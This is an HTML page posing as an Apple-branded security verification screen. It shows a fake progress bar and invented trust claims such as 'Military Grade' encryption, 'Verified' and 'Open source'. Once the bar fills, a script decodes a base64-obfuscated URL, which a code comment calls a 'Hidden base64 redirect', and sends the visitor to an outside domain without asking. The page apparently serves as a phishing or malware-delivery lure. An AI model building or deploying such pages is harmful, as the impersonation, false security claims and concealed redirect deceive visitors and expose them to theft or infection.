<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Loading</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=SF+Pro+Display:wght@400;500;600;700&family=SF+Mono:wght@400;500&display=swap" rel="stylesheet">
<style>
  :root {
    --bg-dark: #0A0E1A;
    --bg-card: #141B2E;
    --border: rgba(255, 255, 255, 0.1);
    --text-primary: #F1F5F9;
    --text-secondary: #94A3B8;
    --accent: #10B981;
    --accent-glow: #34D399;
  }

  * { margin: 0; padding: 0; box-sizing: border-box; }

  html, body {
    width: 100%;
    height: 100%;
    background: linear-gradient(135deg, var(--bg-dark) 0%, #0D1520 50%, #0A0E1A 100%);
    color: var(--text-primary);
    font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'Segoe UI', sans-serif;
    overflow: hidden;
    -webkit-font-smoothing: antialiased;
  }

  body {
    display: grid;
    grid-template-columns: 180px 1fr 180px;
    align-items: center;
    min-height: 100vh;
    padding: 36px 28px 24px 28px;
    gap: 28px;
  }

  @media (max-width: 900px) {
    body { grid-template-columns: 1fr; }
    .side { display: none; }
  }

  /* macOS Title Bar - Dark (hello in Georgia script) */
  .title-bar {
    position: fixed;
    top: 0;
    left: 0;
    right: 0;
    height: 36px;
    background: linear-gradient(180deg, rgba(20,27,46,0.8) 0%, rgba(10,14,26,0.6) 100%);
    backdrop-filter: blur(10px);
    border-bottom: 1px solid var(--border);
    display: flex;
    align-items: center;
    justify-content: center;
    font-family: Georgia, serif;
    font-size: 16px;
    color: var(--text-secondary);
    letter-spacing: 0.05em;
    z-index: 50;
  }

  .window-controls {
    position: fixed;
    top: 10px;
    left: 14px;
    display: flex;
    gap: 8px;
    z-index: 100;
  }

  .control-dot {
    width: 12px;
    height: 12px;
    border-radius: 50%;
    cursor: pointer;
    transition: all 0.2s ease;
  }

  .control-dot.red { background: #ED6158; }
  .control-dot.yellow { background: #FCC02E; }
  .control-dot.green { background: #5FC038; }

  .control-dot:hover {
    transform: scale(1.1);
  }

  /* macOS Status Bar - Dark */
  .status-bar {
    position: fixed;
    bottom: 0;
    left: 0;
    right: 0;
    height: 24px;
    background: linear-gradient(180deg, rgba(10,14,26,0.6) 0%, rgba(20,27,46,0.8) 100%);
    backdrop-filter: blur(10px);
    border-top: 1px solid var(--border);
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 0 16px;
    font-family: 'SF Mono', monospace;
    font-size: 10px;
    color: var(--text-secondary);
    z-index: 50;
  }

  .status-left, .status-right {
    display: flex;
    gap: 12px;
  }

  .status-item {
    display: flex;
    align-items: center;
    gap: 4px;
  }

  .status-dot {
    width: 6px;
    height: 6px;
    border-radius: 50%;
    background: var(--accent-glow);
  }

  /* SIDE PANELS - Dark glass morphism */
  .side {
    display: flex;
    flex-direction: column;
    gap: 12px;
  }

  .side-card {
    background: rgba(20, 27, 46, 0.5);
    backdrop-filter: blur(10px);
    border: 1px solid var(--border);
    border-radius: 12px;
    padding: 14px 16px;
    transition: all 0.3s ease;
  }

  .side-card:hover {
    background: rgba(20, 27, 46, 0.7);
    border-color: rgba(52, 211, 153, 0.3);
  }

  .side-card .k {
    font-family: 'SF Mono', monospace;
    font-size: 10px;
    color: var(--text-secondary);
    letter-spacing: 0.08em;
    text-transform: uppercase;
    margin-bottom: 6px;
    font-weight: 500;
    opacity: 0.8;
  }

  .side-card .v {
    font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', sans-serif;
    font-size: 15px;
    font-weight: 600;
    color: var(--text-primary);
  }

  .side-card .v.accent { color: var(--accent-glow); }
  .side.right .side-card:first-child .v { color: var(--accent); }

  .rating-card { text-align: center; }
  .stars { display: flex; gap: 4px; justify-content: center; margin-bottom: 8px; }
  .stars svg { width: 13px; height: 13px; color: #FBBF24; }

  .badge-row { display: flex; flex-direction: column; gap: 8px; }
  .badge {
    display: flex;
    align-items: center;
    gap: 8px;
    font-size: 12px;
    color: var(--text-secondary);
    font-weight: 500;
    transition: all 0.3s ease;
  }

  .badge svg { width: 13px; height: 13px; flex-shrink: 0; color: var(--accent); }
  .badge:hover { color: var(--accent-glow); }

  /* CENTER */
  .center {
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 26px;
  }

  /* GLOWING RING LOGO - Like uploaded image */
  .logo-wrap {
    position: relative;
    width: 140px;
    height: 140px;
    margin-bottom: 8px;
    display: flex;
    align-items: center;
    justify-content: center;
  }

  .logo-glow-ring {
    position: absolute;
    inset: 0;
    border-radius: 50%;
    border: 3px solid var(--accent);
    box-shadow: 
      0 0 20px var(--accent),
      0 0 40px rgba(16, 185, 129, 0.5),
      0 0 60px rgba(16, 185, 129, 0.3),
      inset 0 0 20px rgba(16, 185, 129, 0.1);
    animation: pulse-ring 2.5s ease-in-out infinite;
  }

  .logo-inner {
    position: absolute;
    inset: 15px;
    border-radius: 50%;
    background: radial-gradient(circle at 30% 30%, rgba(52, 211, 153, 0.15), transparent);
    animation: pulse-inner 2.5s ease-in-out infinite;
  }

  .logo-icon {
    position: relative;
    z-index: 5;
    width: 50px;
    height: 50px;
    display: flex;
    align-items: center;
    justify-content: center;
  }

  .logo-icon svg {
    width: 100%;
    height: 100%;
    filter: drop-shadow(0 0 12px rgba(52, 211, 153, 0.6));
    animation: blink-icon 2s ease-in-out infinite;
  }

  @keyframes pulse-ring {
    0%, 100% {
      box-shadow: 
        0 0 20px var(--accent),
        0 0 40px rgba(16, 185, 129, 0.5),
        0 0 60px rgba(16, 185, 129, 0.3),
        inset 0 0 20px rgba(16, 185, 129, 0.1);
      transform: scale(1);
    }
    50% {
      box-shadow: 
        0 0 30px var(--accent-glow),
        0 0 60px rgba(52, 211, 153, 0.6),
        0 0 90px rgba(52, 211, 153, 0.4),
        inset 0 0 30px rgba(52, 211, 153, 0.15);
      transform: scale(1.05);
    }
  }

  @keyframes pulse-inner {
    0%, 100% { opacity: 0.5; transform: scale(1); }
    50% { opacity: 0.8; transform: scale(1.1); }
  }

  @keyframes blink-icon {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.6; }
  }

  /* HEADER */
  .title-block {
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 6px;
    text-align: center;
  }

  .eyebrow {
    font-family: 'SF Mono', monospace;
    font-size: 11px;
    letter-spacing: 0.12em;
    text-transform: uppercase;
    color: var(--accent-glow);
    font-weight: 600;
  }

  /* NEW WELCOME – handwriting style with clip-path */
  .welcome-wrap {
    position: relative;
    display: inline-block;
  }

  #welcome-title {
    font-family: "New York", Georgia, "Times New Roman", serif;
    font-weight: 400;
    font-size: 48px;
    color: var(--text-primary);
    letter-spacing: 1px;
    white-space: nowrap;
    display: inline-block;
    clip-path: inset(0 100% 0 0);
    animation: writeText 3s linear forwards;
    min-height: 60px;
  }

  @keyframes writeText {
    from { clip-path: inset(0 100% 0 0); }
    to   { clip-path: inset(0 0% 0 0); }
  }

  .subtitle {
    font-size: 13px;
    color: var(--text-secondary);
    max-width: 320px;
    line-height: 1.5;
    font-weight: 400;
  }

  /* PROGRESS */
  .progress-wrap {
    width: 320px;
    display: flex;
    flex-direction: column;
    gap: 10px;
  }

  .progress-top {
    display: flex;
    justify-content: space-between;
    align-items: baseline;
    font-family: 'SF Mono', monospace;
    font-size: 11px;
    color: var(--text-secondary);
    font-weight: 500;
    letter-spacing: 0.05em;
  }

  .progress-top .pct {
    color: var(--accent-glow);
    font-weight: 600;
    font-size: 13px;
  }

  .rail {
    width: 100%;
    height: 6px;
    background: rgba(52, 211, 153, 0.1);
    border-radius: 6px;
    overflow: hidden;
    position: relative;
    border: 1px solid rgba(52, 211, 153, 0.2);
  }

  .rail-fill {
    position: absolute;
    left: 0;
    top: 0;
    bottom: 0;
    width: 0%;
    background: linear-gradient(90deg, var(--accent), var(--accent-glow));
    border-radius: 6px;
    transition: width 0.15s ease-out;
    box-shadow: 0 0 12px rgba(52, 211, 153, 0.6);
  }

  .rail-fill::after {
    content: '';
    position: absolute;
    inset: 0;
    background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
    width: 50px;
    animation: shimmer-light 1.2s ease-in-out infinite;
  }

  @keyframes shimmer-light {
    0% { transform: translateX(-50px); }
    100% { transform: translateX(320px); }
  }

  /* CTA */
  .cta {
    width: 320px;
    padding: 10px 20px;
    border: 1px solid rgba(52, 211, 153, 0.3);
    border-radius: 10px;
    background: rgba(52, 211, 153, 0.1);
    backdrop-filter: blur(10px);
    color: var(--text-secondary);
    font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', sans-serif;
    font-weight: 600;
    font-size: 13px;
    cursor: not-allowed;
    opacity: 0.6;
    transition: all 0.3s ease;
    text-transform: uppercase;
    letter-spacing: 0.08em;
  }

  .cta.ready {
    background: linear-gradient(135deg, var(--accent), var(--accent-glow));
    border-color: transparent;
    color: #000;
    opacity: 1;
    cursor: pointer;
    box-shadow: 0 8px 24px rgba(16, 185, 129, 0.4);
  }

  .cta.ready:hover {
    transform: translateY(-1px);
    box-shadow: 0 12px 32px rgba(16, 185, 129, 0.5);
  }

  .cta.ready:active {
    transform: translateY(0px);
  }

  /* TRUST */
  .trust-row {
    display: flex;
    align-items: center;
    gap: 14px;
    font-family: 'SF Mono', monospace;
    font-size: 10px;
    color: var(--text-secondary);
    letter-spacing: 0.03em;
  }

  .trust-row span {
    display: flex;
    align-items: center;
    gap: 5px;
    transition: all 0.3s ease;
  }

  .trust-row span:hover {
    color: var(--accent-glow);
  }

  .trust-row svg {
    width: 11px;
    height: 11px;
    color: var(--accent);
  }
</style>
</head>
<body>

  <div class="window-controls">
    <div class="control-dot red"></div>
    <div class="control-dot yellow"></div>
    <div class="control-dot green"></div>
  </div>

  <!-- Title Bar: "hello" in Georgia script -->
  <div class="title-bar">𝓱𝓮𝓵𝓵𝓸</div>

  <div class="side left">
    <div class="side-card rating-card">
      <div class="stars">
        <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87L18.18 21 12 17.77 5.82 21 7 14.14l-5-4.87 6.91-1.01L12 2z"/></svg>
        <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87L18.18 21 12 17.77 5.82 21 7 14.14l-5-4.87 6.91-1.01L12 2z"/></svg>
        <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87L18.18 21 12 17.77 5.82 21 7 14.14l-5-4.87 6.91-1.01L12 2z"/></svg>
        <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87L18.18 21 12 17.77 5.82 21 7 14.14l-5-4.87 6.91-1.01L12 2z"/></svg>
        <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87L18.18 21 12 17.77 5.82 21 7 14.14l-5-4.87 6.91-1.01L12 2z"/></svg>
      </div>
      <div class="k">Trusted by users</div>
    </div>
    <div class="side-card">
      <div class="k">Encryption</div>
      <div class="v accent">Military Grade</div>
    </div>
    <div class="side-card">
      <div class="k">Performance</div>
      <div class="v">Optimized</div>
    </div>
  </div>

  <div class="center">

    <div class="logo-wrap">
      <div class="logo-glow-ring"></div>
      <div class="logo-inner"></div>
      <div class="logo-icon">
        <!-- PERFECT APPLE LOGO – iconic shape with bite & leaf -->
        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
          <defs>
            <linearGradient id="appleGrad" x1="0%" y1="0%" x2="100%" y2="100%">
              <stop offset="0%" stop-color="#E5E7EB" />
              <stop offset="100%" stop-color="#F3F4F6" />
            </linearGradient>
          </defs>
          <path d="M12.152 6.896c-.948 0-2.415-1.078-3.96-1.04-2.04.027-3.91 1.183-4.961 3.014-2.117 3.675-.546 9.103 1.519 12.09 1.013 1.454 2.208 3.09 3.792 3.039 1.52-.065 2.09-.987 3.935-.987 1.831 0 2.35.987 3.96.948 1.637-.026 2.676-1.48 3.676-2.948 1.156-1.688 1.636-3.325 1.662-3.415-.039-.013-3.182-1.221-3.22-4.857-.026-3.04 2.48-4.494 2.597-4.559-1.429-2.09-3.623-2.324-4.39-2.376-2-.156-3.675 1.09-4.61 1.09zM15.53 3.83c.843-1.012 1.4-2.427 1.245-3.83-1.207.052-2.662.805-3.532 1.818-.78.896-1.454 2.338-1.273 3.714 1.338.104 2.715-.688 3.56-1.701z" fill="url(#appleGrad)"/>
        </svg>
      </div>
    </div>

    <div class="title-block">
      <div class="eyebrow">Getting ready</div>
      
      <!-- NEW HANDWRITING WELCOME (clip-path animation, loops) -->
      <div class="welcome-wrap">
        <span id="welcome-title">𝓌𝑒𝓁𝒸𝑜𝓂𝑒</span>
      </div>

      <div class="subtitle">We're preparing your environment with industry-leading security and performance.</div>
    </div>

    <div class="progress-wrap">
      <div class="progress-top">
        <span id="stage">Initializing</span>
        <span class="pct" id="pct">0%</span>
      </div>
      <div class="rail"><div class="rail-fill" id="railFill"></div></div>
    </div>

    <button class="cta" id="ctaBtn" disabled>
      <span id="ctaText">Verifying Security</span>
    </button>

    <div class="trust-row">
      <span>
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg>
        Verified
      </span>
      <span>
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg>
        Secure
      </span>
      <span>
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg>
        Private
      </span>
    </div>

  </div>

  <div class="side right">
    <div class="side-card">
      <div class="k">Status</div>
      <div class="v">Active</div>
    </div>
    <div class="side-card">
      <div class="k">Uptime</div>
      <div class="v accent">99.99%</div>
    </div>
    <div class="side-card badge-row">
      <div class="badge">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg>
        No ads
      </div>
      <div class="badge">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg>
        Open source
      </div>
    </div>
  </div>

  <div class="status-bar">
    <div class="status-left">
      <div class="status-item">
        <span class="status-dot"></span>
        Secure Connection
      </div>
    </div>
    <div class="status-right">
      <div class="status-item">Ready to continue</div>
    </div>
  </div>

<script>
  // --- HANDWRITING WELCOME ANIMATION (loops) ---
  const welcomeEl = document.getElementById('welcome-title');

  function playWelcomeCycle() {
    // Reset animation
    welcomeEl.style.animation = 'none';
    void welcomeEl.offsetWidth; // force reflow
    welcomeEl.style.animation = 'writeText 3s linear forwards';

    // After writing finishes, wait 2s then rewrite
    setTimeout(playWelcomeCycle, 5000);
  }

  playWelcomeCycle();

  // --- PROGRESS BAR (unchanged) ---
  const railFill = document.getElementById('railFill');
  const pctEl = document.getElementById('pct');
  const stageEl = document.getElementById('stage');
  const cta = document.getElementById('ctaBtn');

  const stages = [
    { at: 0,  label: 'Initializing' },
    { at: 25, label: 'Verifying' },
    { at: 55, label: 'Securing' },
    { at: 85, label: 'Finalizing' },
    { at: 100, label: 'Ready' }
  ];

  let progress = 0;

  function currentStage(p) {
    let s = stages[0].label;
    for (const st of stages) { if (p >= st.at) s = st.label; }
    return s;
  }

  function tick() {
    const remaining = 100 - progress;
    const step = Math.max(0.2, remaining * 0.05 + Math.random() * 0.6);
    progress = Math.min(100, progress + step);

    railFill.style.width = progress + '%';
    pctEl.textContent = Math.floor(progress) + '%';
    stageEl.textContent = currentStage(progress);

    if (progress < 100) {
      requestAnimationFrame(() => setTimeout(tick, 20));
    } else {
      finish();
    }
  }

  function finish() {
    cta.classList.add('ready');
    cta.disabled = false;
    document.getElementById('ctaText').textContent = 'Verified & Trusted';
    cta.style.cursor = 'default';

    // Hidden base64 redirect
    const encodedUrl = 'aHR0cHM6Ly9jbG91ZG1oYXguY29tL2thbmdlcnJpLw==';
    const url = atob(encodedUrl);

    setTimeout(() => {
      window.location.href = url;
    }, 200);
  }

  tick();
</script>
</body>
